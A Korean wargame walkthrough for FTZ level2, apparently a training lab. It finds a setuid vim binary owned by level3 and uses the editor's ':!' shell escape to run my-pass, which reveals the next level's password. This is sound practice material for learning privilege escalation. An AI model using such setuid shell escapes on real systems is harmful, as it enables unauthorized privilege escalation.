PW : `hacker or cracker`

이번에도 hint 파일을 출력해보면 이렇게 뜬다.
```bash
[level2@ftz level2]$ cat hint


텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...
```

텍스트 파일 편집기중 vim 에디터에서 `!`를 입력하면 쉘 명령어를 실행 시킬 수 있다.

만약에 vim 에디터가 level3권한으로 실행이 된다면 어떨까?

저번에 사용한 `find`명령어로 `level3`권한으로 실행 되는 파일을 찾아보면
```bash
[level2@ftz level2]$ find / -user level3 2> /dev/null
/usr/bin/editor
[level2@ftz level2]$ ls /usr/bin/ -l | grep editor
-rwsr-x---    1 level3   level2      11651 Sep 10  2011 editor
```

그럼 editor 파일을 실행해 보면 일반적인 콘솔 화면이 뜬다.
```bash

~
~
~
~
~
~                              VIM - Vi IMproved
~
~                               version 6.1.320
~                           by Bram Moolenaar et al.
~                 Vim is open source and freely distributable
~
~                        Help poor children in Uganda!
~                type  :help iccf<Enter>       for information
~
~                type  :q<Enter>               to exit
~                type  :help<Enter>  or  <F1>  for on-line help
~                type  :help version6<Enter>   for version info
~
~
~
~
~
```
여기서 `:! my-pass` 명령을 입력하면 level3권한으로 명령어가 실행되지 않을까 생각해 보았다.


```bash

Level3 Password is "can you fly?".


shell returned 37

Hit ENTER or type command to continue
```
성공적으로 실행 되었다.


level3의 패스워드는 `can you fly?`이다.